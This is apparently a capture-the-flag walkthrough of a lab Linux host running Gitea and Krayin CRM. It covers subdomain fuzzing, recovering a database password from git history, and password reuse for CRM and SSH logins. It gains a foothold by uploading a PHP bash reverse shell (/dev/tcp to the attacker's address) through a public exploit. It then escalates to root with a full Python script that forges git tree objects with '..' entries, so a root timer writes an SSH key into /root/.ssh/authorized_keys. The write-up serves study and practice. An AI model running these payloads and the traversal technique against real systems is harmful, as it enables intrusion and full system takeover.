Date : 25/09/2026

Target : 10.129.234.54

`nexus.htb` is a single Linux host. `SSH` and `nginx` are the only open ports, and the web port redirects to the name before it will show a page.

`MITRE ID : Discovery + Network Service Discovery T1046`

```bash
> echo "10.129.234.54 nexus.htb" | sudo tee -a /etc/hosts
10.129.234.54 nexus.htb
> nmap -sC -sV -O -Pn -p- --min-rate=3000 -T4 10.129.234.54
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-25 18:47 +0200
Nmap scan report for 10.129.234.54
Host is up (0.040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap done: 1 IP address (1 host up) scanned in 30.75 seconds
```

`-O` also guessed MikroTik. The service lines are Ubuntu `OpenSSH` and `nginx`. We trust those.

The page is one document. Directory brute force is the wrong door until the links say otherwise.

```bash
> curl -s http://nexus.htb/ -o /tmp/nexus-index.html
> wc -c /tmp/nexus-index.html
49296 /tmp/nexus-index.html
> rg -o -i 'href="[^"]+"|@[a-z0-9.-]+\.[a-z]{2,}' /tmp/nexus-index.html
href="#programmes"
href="#energy-mix"
href="#news"
href="#careers"
href="mailto:careers@nexus.htb"
href="mailto:j.matthew@nexus.htb"
```

Every `href` is an anchor on the same page. `careers@nexus.htb` is a role mailbox. `j.matthew@nexus.htb` is a person. We keep both.

`nginx` on one IP picks the site from the `Host` header. A name it does not know answers `302` with a `154` byte body back to `http://nexus.htb/`. That size is the fallback. A real name will not match it.

`MITRE ID : Reconnaissance + Active Scanning T1595.002`

```bash
> curl -s -o /dev/null -w '%{http_code} %{size_download} %{redirect_url}\n' -H 'Host: nexus.htb' http://10.129.234.54/
200 49296
> curl -s -o /dev/null -w '%{http_code} %{size_download} %{redirect_url}\n' -H 'Host: notreal.nexus.htb' http://10.129.234.54/
302 154 http://nexus.htb/
> ffuf -u http://10.129.234.54/ -H 'Host: FUZZ.nexus.htb' -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -mc 200,204,301,302,401,403 -fs 154 -t 40 -noninteractive
git                     [Status: 200, Size: 14472, Words: 1195, Lines: 242, Duration: 51ms]
billing                 [Status: 302, Size: 390, Words: 60, Lines: 12, Duration: 142ms]
```

`-fs 154` drops the fallback. `git` is its own page. `billing` is a `302`, but the body is `390` bytes, so it is not the brochure.

```bash
> echo "10.129.234.54 git.nexus.htb billing.nexus.htb" | sudo tee -a /etc/hosts
10.129.234.54 git.nexus.htb billing.nexus.htb
> curl -sI http://git.nexus.htb/
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
> curl -s http://git.nexus.htb/ | rg -o -i '<title>[^<]+</title>'
<title>Gitea: Git with a cup of tea</title>
> curl -sI http://billing.nexus.htb/
HTTP/1.1 302 Found
Server: nginx/1.24.0 (Ubuntu)
Location: http://billing.nexus.htb/admin/login
Set-Cookie: XSRF-TOKEN=[REDACTED]; path=/; samesite=lax
Set-Cookie: krayin_crm_session=[REDACTED]; path=/; httponly; samesite=lax
```

`git.nexus.htb` is `Gitea` and it does not ask for a login. `billing.nexus.htb` is `Krayin CRM`. The session cookie is named `krayin_crm_session`, and the redirect is `/admin/login`. We read the public git host first.

`MITRE ID : Collection + Data from Information Repositories T1213`

```bash
> curl -s 'http://git.nexus.htb/api/v1/repos/search?limit=50' | python3 -c 'import json,sys; d=json.load(sys.stdin); print("count", len(d.get("data",[]))); [print(r.get("full_name")) for r in d.get("data",[])]'
count 1
admin/krayin-docker-setup
> curl -s 'http://git.nexus.htb/api/v1/users/search?limit=50' | python3 -c 'import json,sys; d=json.load(sys.stdin); [print(u.get("username"), u.get("full_name")) for u in d.get("data",[])]'
admin
jones
```

One public repository, and the name matches the billing host. The accounts are `admin` and `jones`.

```bash
> git clone http://git.nexus.htb/admin/krayin-docker-setup.git /tmp/krayin-docker-setup
Cloning into '/tmp/krayin-docker-setup'...
> git -C /tmp/krayin-docker-setup show HEAD:.env
APP_URL=http://billing.nexus.htb
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=
```

`git -C` does not change the shell directory. It tells that one `git` command which repository to use. The tip of `.env` points `APP_URL` at `http://billing.nexus.htb` and leaves `DB_PASSWORD` empty. The parent commit is the other copy.

```bash
> git -C /tmp/krayin-docker-setup diff HEAD~1 HEAD -- .env
diff --git a/.env b/.env
--- a/.env
+++ b/.env
-APP_URL=http://nexus.htb
+APP_URL=http://billing.nexus.htb
-DB_PASSWORD=[REDACTED]
+DB_PASSWORD=
```

A line starting with `-` was in the older commit and was deleted by the newer one. The deleted value is a database password. Nothing in the file says it is also the web login. We try it with `j.matthew@nexus.htb`, the person from the careers page.

`MITRE ID : Credential Access + Unsecured Credentials T1552.001`

The login form is `Laravel`. The hidden `_token` has to match the cookie from the same download, or the post is rejected.

```bash
> curl -s -c /tmp/krayin.cj http://billing.nexus.htb/admin/login -o /tmp/krayin-login.html
> TOKEN=$(rg -o 'name="_token" value="[^"]+"' /tmp/krayin-login.html | head -n1 | cut -d'"' -f4)
> curl -s -c /tmp/krayin.cj -b /tmp/krayin.cj -o /dev/null -w '%{http_code} %{redirect_url}\n' -X POST http://billing.nexus.htb/admin/login --data-urlencode "_token=${TOKEN}" --data-urlencode 'email=j.matthew@nexus.htb' --data-urlencode 'password=[REDACTED]'
302 http://billing.nexus.htb/admin/dashboard
```

`302` to `/admin/dashboard` means the CRM accepted the pair. The cookie jar is the session.

```bash
> curl -s -b /tmp/krayin.cj -o /tmp/krayin-dash.html http://billing.nexus.htb/admin/dashboard
> rg -n 'Version:' /tmp/krayin-dash.html
443:                        Version: 2.2.0
```

`Version: 2.2.0` is `Krayin`. The debug bar also prints `Laravel` and `PHP`. Those are the stack under it. `APP_DEBUG` is on, which is why the HTML is huge. We search the product version.

```bash
> searchsploit krayin
Krayin CRM v2.2.x - Authenticated Remote Code Execution    | multiple/webapps/52629.py
```

`/usr/share/exploitdb/exploits/multiple/webapps/52629.py` is `CVE-2026-38526`. It logs in and POSTs a file to `/admin/tinymce/upload`. The body is labeled `image/jpeg`. The saved name is the local file's name. The script prints a URL and does not request it.

`MITRE ID : Initial Access + Exploit Public-Facing Application T1190`

The callback has to hit the VPN address that routes to the lab. Ours was `10.10.15.133`. The listener has to be open before the GET. `-f` must be the short name `shell.php`. A full path becomes the uploaded filename, and that name will not run.

```bash
> mkdir -p /tmp/kx
> cat > /tmp/kx/shell.php << 'EOF'
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.133/4455 0>&1'");
EOF
> nc -lvnp 4455
Listening on 0.0.0.0 4455
> cd /tmp/kx
> python3 /usr/share/exploitdb/exploits/multiple/webapps/52629.py -t http://billing.nexus.htb -u 'j.matthew@nexus.htb' -p '[REDACTED]' -f shell.php
[+] File uploaded successfully.
Path to file: http://billing.nexus.htb/storage/tinymce/f178a1de47fef200d9453fd9be461dca.php
> curl -sv 'http://billing.nexus.htb/storage/tinymce/f178a1de47fef200d9453fd9be461dca.php'
< HTTP/1.1 504 Gateway Time-out
```

The upload only stored the file. The hash name kept the `.php` extension. The GET is what makes `nginx` hand the file to `PHP`. `exec` starts `bash`, and `bash` connects out to `4455`. `curl` sits until `nginx` returns `504` because `PHP` never finishes the HTTP response while that bash is running. The shell is on the listener, not in `curl`.

`MITRE ID : Execution + Unix Shell T1059.004`

```bash
Connection received on 10.129.234.54 40270
bash: cannot set terminal process group (1460): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nexus:~/krayin/storage/app/public/tinymce$ whoami
www-data
```

`www-data` is the account the CRM runs as. The ioctl line is the socket not being a terminal. Commands still run. The git tip had an empty `DB_PASSWORD`. The file on disk is the copy the process reads.

```bash
www-data@nexus:~/krayin/storage/app/public/tinymce$ awk -F: '$7 ~ /bash$/ {print}' /etc/passwd
root:x:0:0:root:/root:/bin/bash
jones:x:1000:1000:,,,:/home/jones:/bin/bash
git:x:111:112:Git Version Control,,,:/home/git:/bin/bash
www-data@nexus:~/krayin/storage/app/public/tinymce$ grep -E '^(APP_URL|DB_)' /var/www/krayin/.env
APP_URL=http://billing.nexus.htb
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=[REDACTED]
DB_PREFIX=
```

`~/krayin/.env` and `/var/www/krayin/.env` are the same file. Mode `-rw-r--r--` is why `www-data` can read it. This database password is not the one from git history. `jones` is the human account. `git` is the `Gitea` service account. We try the live password once, over `SSH`, from our host.

`MITRE ID : Lateral Movement + SSH T1021.004`

```bash
> ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no jones@10.129.234.54
jones@10.129.234.54's password:
jones@nexus:~$ ls
user.txt
jones@nexus:~$ cat user.txt
[REDACTED]
```

`PubkeyAuthentication=no` stops our personal keys from being offered. The host key was already known under other lab addresses. Same image, new IP. `jones` is in.

```bash
jones@nexus:~$ id
uid=1000(jones) gid=1000(jones) groups=1000(jones),100(users)
jones@nexus:~$ sudo -l
Sorry, user jones may not run sudo on nexus.
jones@nexus:~$ systemctl list-timers --all --no-pager
Fri 2026-09-25 12:17:46 UTC  18s  gitea-template-sync.timer  gitea-template-sync.service
```

`sudo` is empty. The timer that is not stock Ubuntu is `gitea-template-sync.timer`, and `LEFT` was under a minute. `--no-pager` keeps `systemctl` from opening `less`. `q` quits `less` if it still opens.

`MITRE ID : Discovery + Scheduled Task/Job T1053.003`

```bash
jones@nexus:~$ systemctl cat gitea-template-sync.service --no-pager
# /etc/systemd/system/gitea-template-sync.service
[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
jones@nexus:~$ systemctl cat gitea-template-sync.timer --no-pager
# /etc/systemd/system/gitea-template-sync.timer
[Timer]
OnBootSec=1min
OnUnitActiveSec=1min
Unit=gitea-template-sync.service
```

Once a minute, root runs `/etc/gitea/template-sync.py`. The script only syncs repositories whose `template` flag is true. It lists files with `git ls-tree` and writes them here:

```bash
jones@nexus:~$ grep -n -E 'STAGING_DIR|stage_path|ls-tree|os.path.join\(stage_path' /etc/gitea/template-sync.py
10:STAGING_DIR = "/home/git/template-staging"
60:    stage_path = os.path.join(STAGING_DIR, owner, name)
70:            GIT + ['ls-tree', '-r', 'HEAD'],
99:        target = os.path.join(stage_path, filepath)
113:            with open(target, 'wb') as f:
```

`os.path.join` glues strings. It does not walk `..`. `open` does. The stage directory is five names below `/`: `home`, `git`, `template-staging`, the owner, the repo. Five `..` components land on `/`, and `root/.ssh/authorized_keys` is then a normal path. We are not searching for that file. We are choosing the string root will create.

```bash
jones@nexus:~$ python3 -c 'import os; p=os.path.join("/home/git/template-staging/jones/rce", "../../../../../root/.ssh/authorized_keys"); print(p); print(os.path.normpath(p))'
/home/git/template-staging/jones/rce/../../../../../root/.ssh/authorized_keys
/root/.ssh/authorized_keys
```

`normpath` is the walk on paper. A normal `git add` refuses a path that contains `..`, so the commit has to be written as raw objects. The repository has to be a template or the timer skips it. These commands run on our machine. The password stays in single quotes because of `!`.

```bash
> curl -s -u 'jones:[REDACTED]' -H 'Content-Type: application/json' -d '{"name":"rce","private":false,"auto_init":true,"template":true}' http://git.nexus.htb/api/v1/user/repos
> ssh-keygen -t ed25519 -f /tmp/kx/rootkey -N ''
> git clone 'http://jones:[REDACTED]@git.nexus.htb/jones/rce.git' /tmp/kx/rce
Cloning into '/tmp/kx/rce'...
```

`build.py` writes the blob, the trees, and the commit straight into `.git/objects`, then points the current branch at that commit. From the top tree, `git ls-tree -r` prints `../../../../../root/.ssh/authorized_keys`. The public key is the blob at the end of that climb. `..` is stored before `README.md` because git sorts names as bytes and rejects an unsorted tree.

```bash
> cat > /tmp/kx/build.py << 'EOF'
#!/usr/bin/env python3
import hashlib, os, time, zlib
os.chdir("/tmp/kx/rce")
def write_obj(data, kind):
    store = f"{kind} {len(data)}\0".encode() + data
    sha = hashlib.sha1(store).hexdigest()
    path = os.path.join(".git", "objects", sha[:2], sha[2:])
    os.makedirs(os.path.dirname(path), exist_ok=True)
    if not os.path.exists(path):
        open(path, "wb").write(zlib.compress(store))
    return sha
def entry(mode, name, sha):
    return f"{mode} {name}".encode() + b"\0" + bytes.fromhex(sha)
key = open("/tmp/kx/rootkey.pub").read().strip() + "\n"
blob = write_obj(key.encode(), "blob")
readme = write_obj(b"# Template\n", "blob")
node = write_obj(entry("100644", "authorized_keys", blob), "tree")
node = write_obj(entry("40000", ".ssh", node), "tree")
node = write_obj(entry("40000", "root", node), "tree")
for _ in range(4):
    node = write_obj(entry("40000", "..", node), "tree")
root = write_obj(entry("40000", "..", node) + entry("100644", "README.md", readme), "tree")
ts = int(time.time())
commit = f"tree {root}\nauthor x <x@x> {ts} +0000\ncommitter x <x@x> {ts} +0000\n\ninit\n"
sha = write_obj(commit.encode(), "commit")
ref = open(".git/HEAD").read().strip().split()[1]
open(os.path.join(".git", ref), "w").write(sha + "\n")
print(ref, sha)
EOF
> python3 /tmp/kx/build.py
refs/heads/main 6cb272c40fa15e0012379520d2b6612bc42e62ff
> git -C /tmp/kx/rce push --force origin HEAD
warning: unable to access '../../../../../root/.gitattributes': Permission denied
warning: unable to access '../../../../../root/.ssh/.gitattributes': Permission denied
To http://git.nexus.htb/jones/rce.git
 + 2acfad6...6cb272c HEAD -> main (forced update)
```

`python3 /tmp/kx/build.py` only updates the local clone. The push replaces `main` on `Gitea`. `2acfad6` was the automatic first commit. `6cb272c` is the crafted one. The two warnings are our git, on our machine, following `..` and failing to read root's `.gitattributes`. The pack still went out. That is the same walk the timer will make on the box.

`MITRE ID : Persistence + SSH Authorized Keys T1098.004`

```bash
jones@nexus:~$ tail -n 20 /var/log/template-sync.log
[2026-09-25 12:37:47] Template sync starting
[2026-09-25 12:37:47] Found 1 template repo(s)
[2026-09-25 12:37:47] Syncing template: jones/rce
[2026-09-25 12:37:47]   synced: ../../../../../root/.ssh/authorized_keys
[2026-09-25 12:37:47]   synced: README.md
[2026-09-25 12:37:47] Template sync complete
```

The `synced:` line with `..` is root writing the key. One minute is the timer. Then the key logs in.

```bash
> ssh -i /tmp/kx/rootkey root@10.129.234.54
root@nexus:~# cat root.txt
[REDACTED]
```